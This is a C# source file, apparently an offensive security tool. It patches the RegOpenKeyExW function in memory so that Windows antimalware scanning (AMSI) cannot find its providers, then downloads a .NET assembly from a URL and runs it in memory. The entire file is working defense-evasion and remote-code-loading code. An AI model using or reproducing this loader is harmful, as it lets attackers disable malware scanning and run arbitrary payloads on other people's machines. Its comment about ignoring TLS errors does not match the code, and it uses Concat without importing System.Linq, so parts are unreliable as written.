using System;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;


public static class TrollDisappearKey
{

    [DllImport("KERNELBASE.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int RegOpenKeyExW(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
    public delegate int delegateRegOpenKeyExW(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);

    static lib hook1 = new lib();

    

    public static void DisappearKey()
    {
        delegateRegOpenKeyExW A = RegOpenKeyWDetour;

        //Replace assembly code for address at RegOpenKeyExW with tampoline to RegOpenKeyWDetour
        hook1.Install(hook1.GetProcAddress("KERNELBASE.dll", "RegOpenKeyExW"), Marshal.GetFunctionPointerForDelegate(A));
    }


    static private int RegOpenKeyWDetour(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult)
    {
        try
        {
            //set assembly code for address at RegOpenKeyExW back to original so that we can make the call
            //we are just tampering the query to lpSubKey
            hook1.Suspend();


            if (lpSubKey == @"Software\Microsoft\AMSI\Providers")
            {
                return RegOpenKeyExW(hKey, @"Software\Microsoft\AMSI\Providers ", ulOptions, samDesired, out phkResult);

            }

            return RegOpenKeyExW(hKey, lpSubKey, ulOptions, samDesired, out phkResult);

        }
        finally
        {
            //reinstall the hook
            hook1.Resume();

        }

    }


    public static void Main(string[] args)
    {
        //ignore tls errors
        ServicePointManager.Expect100Continue = true;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

        //call the function to install the hook which essentially makes lpSubKey disappear
        //if first argument is passed as disabled, hook will not trigger
        if (args[1].Split(',')[0] != "disable") { 
        DisappearKey();
        }

        //standard assembly load .exe and call main with args
        ExecuteAssembly(new WebClient().DownloadData(args[0]), args[1]);
    }


    public static void ExecuteAssembly(Byte[] assemblyBytes, string comma_separated_args)
    {

        Assembly assembly = Assembly.Load(assemblyBytes);
        MethodInfo method = assembly.EntryPoint;

        object[] parameters = new object[] { comma_separated_args.Split(',') };
        string input = "";

        while (input != "exit")
        {

            method.Invoke(null, parameters);
            Console.Write("Pass in arguments comma delimited or type exit\r\n");
            input = Console.ReadLine();
            parameters = new object[] { input.Split(',') };

        }
    }
}


// shortened hooking library 
public class lib
{
    private int oldProtect;
private IntPtr targetAddr, hookAddr;
private byte[] originalBytes, hookBytes;
public const int PAGE_EXECUTE_READWRITE = 0x40;

[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
public static extern IntPtr GetModuleHandle(string lpModuleName);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool VirtualProtect(IntPtr lpAddress, int size, int newProtect, out int oldProtect);

public void Install(IntPtr target, IntPtr hook)
{
    if (target == IntPtr.Zero || hook == IntPtr.Zero)
        throw new ArgumentException("Invalid address.");

    targetAddr = target;
    hookAddr = hook;

    if (!VirtualProtect(targetAddr, 12, PAGE_EXECUTE_READWRITE, out oldProtect))
        throw new InvalidOperationException("Memory protection change failed.");

    originalBytes = ReadBytes(targetAddr, 12);
    hookBytes = new byte[] { 0x48, 0xB8 }         // mov rax, immediate64
        .Concat(BitConverter.GetBytes(hook.ToInt64()))
        .Concat(new byte[] { 0x50, 0xC3 })         // push rax; ret
        .ToArray();

    if (!WriteBytes(hookBytes, targetAddr))
        throw new InvalidOperationException("Write failed.");
}

public void Suspend() => WriteBytes(originalBytes, targetAddr);

public void Resume() => WriteBytes(hookBytes, targetAddr);

private byte[] ReadBytes(IntPtr addr, int size)
{
    byte[] buf = new byte[size];
    Marshal.Copy(addr, buf, 0, size);
    return buf;
}

private bool WriteBytes(byte[] data, IntPtr addr)
{
    try { Marshal.Copy(data, 0, addr, data.Length); return true; }
    catch { return false; }
}

public IntPtr GetProcAddress(string lib, string func)
    => GetProcAddress(GetModuleHandle(lib), func);
}




